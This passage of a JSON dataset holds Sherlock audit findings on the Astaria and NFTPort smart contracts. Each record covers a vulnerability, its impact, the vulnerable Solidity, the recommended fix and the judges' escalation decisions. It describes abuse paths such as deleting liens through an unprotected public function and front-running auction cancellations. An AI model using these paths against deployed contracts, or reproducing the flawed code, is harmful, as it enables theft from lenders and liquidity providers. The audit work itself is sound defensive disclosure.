\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue with the AuctionHouse.sol code in the 2022-10-astaria-judging project on Github. The issue is that when an auction is canceled and outstanding debt is repaid, the current highest bidder is not refunded and will lose their funds. This can be exploited by a malicious borrower who lets the loan expire without repayment, triggers an auction, lets bids below reserve price, and attempts to front-run any bid higher than the reserve price to cancel the auction and let the highest bidder pay out the liens. The recommended fix is to add the refund logic to the cancel auction flow, similar to the create bid auction flow. This issue was found by minhquanym, neila, 0xRajeev, TurnipBoy, hansfriese, Prefix, peanuts, csanuragjain, bin2chen, Jeiwan, and chainNue and was reviewed manually. Escalations were accepted by IAmTurnipBoy and Evert0x. Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/202",
      "tags": [],
      "finders": [
        "csanuragjain",
        "chainNue",
        "Jeiwan",
        "bin2chen",
        "minhquanym",
        "0xRajeev",
        "neila",
        "TurnipBoy",
        "hansfriese",
        "peanuts",
        "Prefix"
      ]
    },
    {
      "id": "3643",
      "title": "H-5: `commitToLiens` always reverts",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/204 \n\n## Found by \nHonorLt, 0xRajeev, rvierdiiev, bin2chen, Jeiwan\n\n## Summary\n\nThe function `commitToLiens()` always reverts at the call to `_returnCollateral()` which prevents borrowers from depositing collateral and requesting loans in the protocol.\n\n## Vulnerability Detail\n\nThe collateral token with `collateralId` is already minted directly to the caller (i.e. borrower) in `commitToLiens()` at the call to `_transferAndDepositAsset()` function. That's because while executing `_transferAndDepositAsset` the NFT is transferred to `COLLATERAL_TOKEN` whose `onERC721Received` mints the token with `collateralId` to borrower (`from` address) and not the `operator_` (i.e. `AstariaRouter`) because `operator_ != from_`.\n\nHowever, the call to `_returnCollateral()` in `commitToLiens()` incorrectly assumes that this has been minted to the operator and attempts to transfer it to the borrower which will revert because the `collateralId` is not owned by  `AstariaRouter` as it has already been transferred/minted to the borrower.\n\n## Impact\n\nThe function `commitToLiens()` always reverts, preventing borrowers from depositing collateral and requesting loans in the protocol, thereby failing to bootstrap its core NFT lending functionality.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L244-L274\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L578-L587\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/CollateralToken.sol#L282-L284\n4. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L589-L591\n\n## Tool used\n\nManual Review\n\n## Recommendation\nRemove the call to `_returnCollateral()` in `commitToLiens()`.\n\n## Discussion\n\n**secureum**\n\nEscalate for 2 USDC.\n\nGiven the impact of failing to bootstrap core protocol functionality as described above, we still think this is of high-severity (not Medium as judged) unlike a DoS that affects only a minority of protocol flows. Also, this is not a dup of #195.\n\ncc @berndartmueller @lucyoa\n\n**sherlock-admin**\n\n > Escalate for 2 USDC.\n> \n> Given the impact of failing to bootstrap core protocol functionality as described above, we still think this is of high-severity (not Medium as judged) unlike a DoS that affects only a minority of protocol flows. Also, this is not a dup of #195.\n> \n> cc @berndartmueller @lucyoa\n\nYou've created a valid escalation for 2 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nA bug report has been issued related to the function `commitToLiens()` in the protocol AstariaRouter. This function always reverts when attempting to call `_returnCollateral()`, preventing borrowers from depositing collateral and requesting loans. This is due to the NFT being transferred to `COLLATERAL_TOKEN` in `_transferAndDepositAsset()` which mints the token with `collateralId` to borrower (`from` address) and not the `operator_` (i.e. `AstariaRouter`). The impact of this bug is that the core NFT lending functionality of the protocol fails to bootstrap. The code snippet related to this bug can be found at the source link. The bug was found by HonorLt, 0xRajeev, rvierdiiev, bin2chen, Jeiwan. The recommended solution is to remove the call to `_returnCollateral()` in `commitToLiens()`. The issue was escalated for 2 USDC and accepted by Evert0x. The contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/204",
      "tags": [],
      "finders": [
        "Jeiwan",
        "bin2chen",
        "0xRajeev",
        "HonorLt",
        "rvierdiiev"
      ]
    },
    {
      "id": "3642",
      "title": "H-4: _deleteLienPosition can be called by anyone to delete any lien they wish",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/233 \n\n## Found by \nobront, yixxas, ctf\\_sec, TurnipBoy, zzykxx, 0x0, tives\n\n## Summary\n\n`_deleteLienPosition` is a public function that doesn't check the caller. This allows anyone to call it an remove whatever lien they wish from whatever collateral they wish\n\n## Vulnerability Detail\n\n    function _deleteLienPosition(uint256 collateralId, uint256 position) public {\n      uint256[] storage stack = liens[collateralId];\n      require(position < stack.length, \"index out of bounds\");\n\n      emit RemoveLien(\n        stack[position],\n        lienData[stack[position]].collateralId,\n        lienData[stack[position]].position\n      );\n      for (uint256 i = position; i < stack.length - 1; i++) {\n        stack[i] = stack[i + 1];\n      }\n      stack.pop();\n    }\n\n`_deleteLienPosition` is a `public` function and doesn't validate that it's being called by any permissioned account. The result is that anyone can call it to delete any lien that they want. It wouldn't remove the lien data but it would remove it from the array associated with `collateralId`, which would allow it to pass the `CollateralToken.sol#releaseCheck` and the underlying to be withdrawn by the user. \n\n## Impact\n\nAll liens can be deleted completely rugging lenders\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L651-L664\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange `_deleteLienPosition` to `internal` rather than `public`.\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nDeleting leans allows borrower to steal funds because they never have to repay the funds the borrowed. Should be high risk\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Deleting leans allows borrower to steal funds because they never have to repay the funds the borrowed. Should be high risk\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nA bug was discovered in the `_deleteLienPosition` function in the LienToken.sol file of the Sherlock-Audit 2022-10-astaria project. This function is public, meaning anyone can call it to delete any lien they wish from whatever collateral they wish. This could allow a user to delete a lien and withdraw the underlying collateral without ever repaying the loan. This was discovered by obront, yixxas, ctf\\_sec, TurnipBoy, zzykxx, 0x0, and tives. \n\nThe code snippet for the `_deleteLienPosition` function is available at https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L651-L664. The impact of the bug is that it could allow a borrower to steal funds.\n\nThe recommendation to fix the bug is to change the `_deleteLienPosition` function to `internal` rather than `public`. This was discovered through manual review. \n\nTurnipBoy suggested that the issue should be escalated for 1 USDC and sherlock-admin accepted the escalation. This means that contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/233",
      "tags": [],
      "finders": [
        "yixxas",
        "TurnipBoy",
        "tives",
        "0x0",
        "obront",
        "zzykxx",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3641",
      "title": "H-3: buyoutLien() will cause the vault to fail to processEpoch()",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/245 \n\n## Found by \nbin2chen\n\n## Summary\nLienToken#buyoutLien() did not reduce vault#liensOpenForEpoch\nwhen vault#processEpoch()will check vault#liensOpenForEpoch[currentEpoch] == uint256(0)\nso processEpoch() will fail\n\n## Vulnerability Detail\nwhen create LienToken , vault#liensOpenForEpoch[currentEpoch] will ++\nwhen repay  or liquidate ,  vault#liensOpenForEpoch[currentEpoch] will --\nand LienToken#buyoutLien() will transfer from  vault to to other receiver,so liensOpenForEpoch need reduce \n```solidity\nfunction buyoutLien(ILienToken.LienActionBuyout calldata params) external {\n   ....\n    /**** tranfer but not liensOpenForEpoch-- *****/\n    _transfer(ownerOf(lienId), address(params.receiver), lienId);\n  }\n```\n\n\n## Impact\nprocessEpoch() maybe fail\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L121\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n```solidity\n  function buyoutLien(ILienToken.LienActionBuyout calldata params) external {\n....\n\n+   //do decreaseEpochLienCount()\n+   address lienOwner = ownerOf(lienId);\n+    bool isPublicVault = IPublicVault(lienOwner).supportsInterface(\n+      type(IPublicVault).interfaceId\n+    );\n+    if (isPublicVault && !AUCTION_HOUSE.auctionExists(collateralId)) {      \n+        IPublicVault(lienOwner).decreaseEpochLienCount(\n+          IPublicVault(lienOwner).getLienEpoch(lienData[lienId].start + lienData[lienId].duration)\n+        );\n+    }    \n\n    lienData[lienId].last = block.timestamp.safeCastTo32();\n    lienData[lienId].start = block.timestamp.safeCastTo32();\n    lienData[lienId].rate = ld.rate.safeCastTo240();\n    lienData[lienId].duration = ld.duration.safeCastTo32();\n    _transfer(ownerOf(lienId), address(params.receiver), lienId);\n  }\n```\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nDuplicate of #194, two sides of the same coin. One points out it that buyout doesn't decrement correctly on one side and the other points out it doesn't increment correctly on the other side\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Duplicate of #194, two sides of the same coin. One points out it that buyout doesn't decrement correctly on one side and the other points out it doesn't increment correctly on the other side\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation rejected.\n\nThe argument is not giving us full conviction this should be tagged as a duplicate.\n\n**sherlock-admin**\n\n> Escalation rejected.\n> \n> The argument is not giving us full conviction this should be tagged as a duplicate.\n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nThis bug report is about an issue found in the LienToken#buyoutLien() function. The issue is that the function does not reduce vault#liensOpenForEpoch when transferring from the vault to another receiver. This means that when vault#processEpoch() checks if vault#liensOpenForEpoch[currentEpoch] is equal to uint256(0), it will fail. This bug was found by bin2chen and was manually reviewed. The code snippet in question can be found at https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L121. The impact of this bug is that processEpoch() may fail. The recommendation is to add a decreaseEpochLienCount() function to the buyoutLien() function. Finally, the escalation of this issue was rejected as the argument was not giving sufficient conviction that it should be tagged as a duplicate.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/245",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "3640",
      "title": "H-2: `LIEN_TOKEN.ownerOf(i)` should be `LIEN_TOKEN.ownerOf(liensRemaining[i])`",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/259 \n\n## Found by \n\\_\\_141345\\_\\_, 0xRajeev\n\n## Summary\n\nIn `endAuction()`, the check for public vault owner is referred to the wrong lien token id. And the actual vault lien amount is not properly recorded. \n\n\n## Vulnerability Detail\n\nThe lien token id should be queried is `liensRemaining[i]` instead of `i`.\n\n\n## Impact\n\n`YIntercept` will not be correctly recorded. The accounting for LienToken amounts will be wrong. Hence the `totalAssets` on book will be wrong, eventually the contract and users could lose fund due to the wrong accounting.\n\n\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L192-L204\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange `LIEN_TOKEN.ownerOf(i)` to `LIEN_TOKEN.ownerOf(liensRemaining[i])`.",
      "summary": "\nThis bug report is about an issue in the code of the Astaria-GPL project. The issue is that in the `endAuction()` function, the check for the public vault owner is referred to the wrong lien token id. The lien token id should be queried should be `liensRemaining[i]` instead of `i`. This means that the actual vault lien amount is not properly recorded, resulting in the wrong accounting for LienToken amounts, and eventually the contract and users could lose funds due to the wrong accounting. The bug was found by \\_\\_141345\\_\\_ and 0xRajeev, and the tool used was manual review. The recommendation is to change `LIEN_TOKEN.ownerOf(i)` to `LIEN_TOKEN.ownerOf(liensRemaining[i])` in order to fix the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/259",
      "tags": [],
      "finders": [
        "0xRajeev",
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "3639",
      "title": "H-1: The implied value of a public vault can be impaired, liquidity providers can lose funds",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/272 \n\n## Found by \nJeiwan\n\n## Summary\nThe implied value of a public vault can be impaired, liquidity providers can lose funds\n## Vulnerability Detail\nBorrowers can partially repay their liens, which is handled by the `_payment` function ([LienToken.sol#L594](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L594)).\nWhen repaying a part of a lien, `lien.amount` is updated to include currently accrued debt ([LienToken.sol#L605-L617](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L605-L617)):\n```solidity\nLien storage lien = lienData[lienId];\nlien.amount = _getOwed(lien); // @audit current debt, including accrued interest; saved to storage!\n```\nNotice that `lien.amount` is updated in storage, and `lien.last` wasn't updated.\n\nThen, lien's slope is subtracted from vault's slope accumulator to be re-calculated after the repayment ([LienToken.sol#L620-L630](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L620-L630)):\n```solidity\nif (isPublicVault) {\n  // @audit calculates and subtracts lien's slope from vault's slope\n  IPublicVault(lienOwner).beforePayment(lienId, paymentAmount);\n}\nif (lien.amount > paymentAmount) {\n  lien.amount -= paymentAmount;\n  // @audit lien.last is updated only after payment amount subtraction\n  lien.last = block.timestamp.safeCastTo32();\n  // slope does not need to be updated if paying off the rest, since we neutralize slope in beforePayment()\n  if (isPublicVault) {\n    // @audit re-calculates and re-applies lien's slope after the repayment\n    IPublicVault(lienOwner).afterPayment(lienId);\n  }\n}\n```\n\nIn the `beforePayment` function, `LIEN_TOKEN().calculateSlope(lienId)` is called to calculate lien's current slope ([PublicVault.sol#L433-L442](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L433-L442)):\n```solidity\nfunction beforePayment(uint256 lienId, uint256 amount) public onlyLienToken {\n  _handleStrategistInterestReward(lienId, amount);\n  uint256 lienSlope = LIEN_TOKEN().calculateSlope(lienId);\n  if (lienSlope > slope) {\n    slope = 0;\n  } else {\n    slope -= lienSlope;\n  }\n  last = block.timestamp;\n}\n```\n\nThe `calculateSlope` function reads a lien from storage and calls `_getOwed` again ([LienToken.sol#L440-L445](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L440-L445)):\n```solidity\nfunction calculateSlope(uint256 lienId) public view returns (uint256) {\n  // @audit lien.amount includes interest accrued so far\n  Lien memory lien = lienData[lienId];\n  uint256 end = (lien.start + lien.duration);\n  uint256 owedAtEnd = _getOwed(lien, end);\n  // @audit lien.last wasn't updated in `_payment`, it's an older timestamp\n  return (owedAtEnd - lien.amount).mulDivDown(1, end - lien.last);\n}\n```\n\nThis is where double counting of accrued interest happens. Recall that lien's amount already includes the interest that was accrued by this moment (in the `_payment` function). Now, interest is calculated again and *is applied to the amount that already includes (a portion) it* ([LienToken.sol#L544-L550](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L544-L550)):\n```solidity\nfunction _getOwed(Lien memory lien, uint256 timestamp)\n  internal\n  view\n  returns (uint256)\n{\n  // @audit lien.amount already includes interest accrued so far\n  return lien.amount + _getInterest(lien, timestamp);\n}\n```\n\n[LienToken.sol#L177-L196](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L177-L196):\n```solidity\nfunction _getInterest(Lien memory lien, uint256 timestamp)\n  internal\n  view\n  returns (uint256)\n{\n  if (!lien.active) {\n    return uint256(0);\n  }\n  uint256 delta_t;\n  if (block.timestamp >= lien.start + lien.duration) {\n    delta_t = uint256(lien.start + lien.duration - lien.last);\n  } else {\n    // @audit lien.last wasn't updated in `_payment`, so the `delta_t` is bigger here\n    delta_t = uint256(timestamp.safeCastTo32() - lien.last);\n  }\n  return\n    // @audit rate applied to a longer delta_t and multiplied by a bigger amount than expected\n    delta_t.mulDivDown(lien.rate, 1).mulDivDown(\n      lien.amount,\n      INTEREST_DENOMINATOR\n    );\n}\n```\n## Impact\nDouble counting of interest will result in a wrong lien slope, which will affect the vault's slope accumulator.  This will result in an invalid implied value of a vault ([PublicVault.sol#L406-L413](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L406-L413)):\n1. If miscalculated lien slope is bigger than expected, vault's slope will be smaller than expected (due to the subtraction in `beforePayment`), and vault's implied value will also be smaller. Liquidity providers will lose money because they won't be able to redeem the whole liquidity (vault's implied value, `totalAssets`, is used in the conversion of LP shares, [ERC4626-Cloned.sol#L392-L412](https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/ERC4626-Cloned.sol#L392-L412))\n1. If miscalculated lien slope is smaller than expected, vault's slope will be higher, and vaults implied value will also be higher. However, it won't be backed by actual liquidity, thus the liquidity providers that exit earlier will get a bigger share of the underlying assets. The last liquidity provider won't be able to get their entire share.\n\n## Code Snippet\nSee Vulnerability Detail\n## Tool used\nManual Review\n## Recommendation\nIn the `_payment` function, consider updating `lien.amount` after the `beforePayment` call:\n```diff\n--- a/src/LienToken.sol\n+++ b/src/LienToken.sol\n@@ -614,12 +614,13 @@ contract LienToken is ERC721, ILienToken, Auth, TransferAgent {\n       type(IPublicVault).interfaceId\n     );\n\n-    lien.amount = _getOwed(lien);\n-\n     address payee = getPayee(lienId);\n     if (isPublicVault) {\n       IPublicVault(lienOwner).beforePayment(lienId, paymentAmount);\n     }\n+\n+    lien.amount = _getOwed(lien);\n+\n     if (lien.amount > paymentAmount) {\n       lien.amount -= paymentAmount;\n       lien.last = block.timestamp.safeCastTo32();\n```\nIn this case, lien's slope calculation won't be affected in the `beforePayment` call and the correct slope will be removed from the slope accumulator.",
      "summary": "\nThis bug report concerns the \"LienToken.sol\" smart contract of the Astaria project. It was found by Jeiwan and is related to the issue of double counting of accrued interest. This double counting can lead to an incorrect lien slope, which in turn can affect the vault's slope accumulator, resulting in an invalid implied value of a vault. This can lead to liquidity providers losing funds, as they may not be able to redeem the whole liquidity. The recommendation is to update the \"LienToken.sol\" smart contract in the \"_payment\" function by updating the \"lien.amount\" after the \"beforePayment\" call. This will ensure that the correct slope is removed from the slope accumulator and liquidity providers will not lose funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/272",
      "tags": [],
      "finders": [
        "Jeiwan"
      ]
    },
    {
      "id": "3555",
      "title": "M-10: Missing check for equal length arrays in transferByOwnerBatch and mintByOwnerBatch",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/33 \n\n## Found by \nobront\n\n## Summary\n\nThe `transferByOwnerBatch()` and `mintByOwnerBatch()` functions in the ERC1155 implementation does not check whether the lengths of the arrays submitted are equal. This can lead to unexpected results.\n\n## Vulnerability Detail\n\nIn the `transferByOwnerBatch()` function, the user submits three arrays (addresses, ids, and amounts), while in the `mintByOwnerBatch()` function, the user submits four arrays (addresses, ids, amounts, uris).\n\nThe expectation is that the user submitting the function will ensure that the indexes of the arrays correspond to the correct values in the other arrays, and thus that the lengths will be the same.\n\nCommon practice in such a situation is to verify that the lengths are equal to ensure the user hasn't made an error. In other functions like `burnBatch()`, this verification is done by the underlying ERC1155 function. \n\nHowever, in these two functions, we simply iterate through the `ids` array without performing this check, and then call out to the underlying ERC1155 `_safeTransferFrom()`  or `_mint()` functions for each id separately.\n\n## Impact\n\nIf the `ids` array is a shorter length than the other arrays, the additional values in the other arrays will be ignored. This could lead to transfers with unexpected results, which would be better served by reverting.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L206-L215\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L279-L299\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd a check to the `transferByOwnerBatch()` function that confirms that to, ids, and amounts are all equal length.\n\n```solidity\nrequire(ids.length == to.length, \"mismatched array lengths\");\nrequire(ids.length == amounts.length, \"mismatched array lengths\");\n```\n\nAdd a check to the `mintByOwnerBatch()` function that confirms that to, ids, amounts, and uris are all equal length.\n\n```solidity\nrequire(ids.length == to.length, \"mismatched array lengths\");\nrequire(ids.length == amounts.length, \"mismatched array lengths\");\nrequire(ids.length == uris.length, \"mismatched array lengths\");\n```\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/13\n\n**rayn731**\n\nFixed, checks the arrays' length should be equal.",
      "summary": "\nThis bug report is about two functions in the ERC1155 implementation, `transferByOwnerBatch()` and `mintByOwnerBatch()`. These functions do not check whether the lengths of the arrays submitted by the user are equal. This can lead to unexpected results, as the extra values in the other arrays will be ignored. To prevent this issue, a check should be added to both functions to ensure that the lengths of the arrays are equal. This has been fixed in the code, and the check is now in place.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/33",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "3554",
      "title": "M-9: Factory uses signature that do not have expiration",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/46 \n\n## Found by \nrvierdiiev\n\n## Summary\nNftPort can't remove license from user, once the signature was provided to it, without changing `SIGNER_ROLE` address.\n\n## Vulnerability Detail\nIn Factory contract there are few [methods](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L186-L225) that are called when signed by trusted signer.\n\nThis is how the signature is checked\n```solidity\nsignedOnly(abi.encodePacked(msg.sender, instance, data), signature)\n```\n\nAs you can see there is no any expiration time. That means that once, the signer has signed the signature for the user it can use it for the end of life. It's like lifetime license.\nThe only option to remove the license from user is to revoke `SIGNER_ROLE` and set it to another account. \nBut it's possible that the NFTPort will have a need to do that with current signer.\n## Impact\nLicense can't be removed.\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L222\n## Tool used\n\nManual Review\n\n## Recommendation\nAdd expiration param to the signature.\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/18\n\n**rayn731**\n\nFixed, it checks expiration on `metadata.expiration`, and it follows EIP-712 standard for hashing and signing data.",
      "summary": "\nThis bug report is about the Factory contract in the NftPort system which cannot remove a license from a user once the signature was provided to it, without changing the SIGNER_ROLE address. The signature was checked using the method `signedOnly(abi.encodePacked(msg.sender, instance, data), signature)`, however, there was no expiration time set which means that the signature can be used for a lifetime. The only way to remove the license from the user is to revoke the SIGNER_ROLE and set it to another account.\n\nThe impact of this bug is that the license cannot be removed. The code snippet for this issue can be found at https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L222. The tool used to find this bug was manual review.\n\nThe recommendation for this issue is to add an expiration parameter to the signature. This issue has been fixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/18 and it checks expiration on `metadata.expiration`, and it follows EIP-712 standard for hashing and signing data.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/46",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "3553",
      "title": "M-8: _validateDeploymentConfig function in NFTCollection.sol doesn't check all conditions",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/51 \n\n## Found by \nElKu\n\n## Summary\n\nDue to not thoroughly checking all conditions of the deployment config, users might not be able to mint certain amount of tokens. \n\n## Vulnerability Detail\n\nIn `NFTCollection.sol`, there is a function called [_validateDeploymentConfig](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L325-L340), which checks whether the `deploymentConfig` input to [initialize](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L145) function is valid. \n\nThe function checks whether the `maxSupply` and `tokensPerMint` are greater than zero. But it never checks if the `tokensPerMint` is less than or equal to `maxSupply`. \n\nSuppose `maxSupply` < `tokensPerMint`. Then if the user calls a function which in-turn calls the  [_mintTokens](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L317) function with an `amount` equal to `tokensPerMint`, it will revert. Even though he is technically trying to mint as per the `rules`. This is because the `availableSupply()` won't be greater than `amount`. \n\n\n## Impact\n\n1. Dissatisfaction and Frustration of the user along with loss of his gas fees. \n2. The contract would need redeployment as deployment config cannot be changed once its set.\n\n## Code Snippet\n\n```solidity\n    function _mintTokens(address to, uint256 amount) internal {\n        require(amount <= _deploymentConfig.tokensPerMint, \"Amount too large\");\n        require(amount <= availableSupply(), \"Not enough tokens left\");\n\n        _safeMint(to, amount);\n    }\n```\n\n## Tool used\n\nManual Review, VSCode\n\n## Recommendation\n\nAdd a require statement in the `_validateDeploymentConfig` function:\n```solidity\nrequire(config.tokensPerMint <= config.maxSupply, \"Tokens per mint must be lte Maximum supply\");\n```\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/7\n\n**rayn731**\n\nFixed, it checks tokens per mint must be less than max supply.",
      "summary": "\nThis bug report was found by ElKu and it concerns the _validateDeploymentConfig function in NFTCollection.sol. The _validateDeploymentConfig function is used to check whether the deploymentConfig input to the initialize function is valid. The function checks whether the maxSupply and tokensPerMint are greater than zero, but it does not check if the tokensPerMint is less than or equal to maxSupply. This could lead to users not being able to mint certain amounts of tokens, even if they are technically trying to mint as per the rules. \n\nThe impact of this bug is dissatisfaction and frustration of the user, as well as the loss of their gas fees. The contract would also need to be redeployed, as the deployment config cannot be changed once it is set. \n\nThe bug was fixed by adding a require statement in the _validateDeploymentConfig function, which checks if the tokensPerMint is less than maxSupply. This was fixed in a pull request by hyperspacebunny and rayn731.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/51",
      "tags": [],
      "finders": [
        "ElKu"
      ]
    },
    {
      "id": "3552",
      "title": "M-7: registerTemplate() can't handle properly when ITemplate version  is 0",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/80 \n\n## Found by \nbin2chen\n\n## Summary\nFactory.sol\nwhen register one template , and template ' s version is 0, the latestImplementation[templateName] will be address(0)\nand add other version, \"_templateNames\" will duplicate\n\n## Vulnerability Detail\nWhen version is equal 0  latestImplementation[templateName]  don't set\n```solidity\n   function _setTemplate(\n        string memory templateName,\n        uint256 templateVersion,\n        address implementationAddress\n    ) internal {\n...\n\n        if (latestImplementation[templateName] == address(0)) { /****add other version, _templateNames will duplicate ****/\n            _templateNames.push(templateName);\n        }\n\n        if (templateVersion > latestVersion[templateName]) {\n            latestVersion[templateName] = templateVersion;\n            latestImplementation[templateName] = implementationAddress; /****templateVersion==0 ,  don't set ****/\n        }\n\n    }\n```\n\n\n## Impact\nlatestImplementation[templateName] and _templateNames will error.\nexternal contracts may think there is no setup, resulting in duplicate setups that keep failing\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L415\n\n## Tool used\n\nManual Review\n\n## 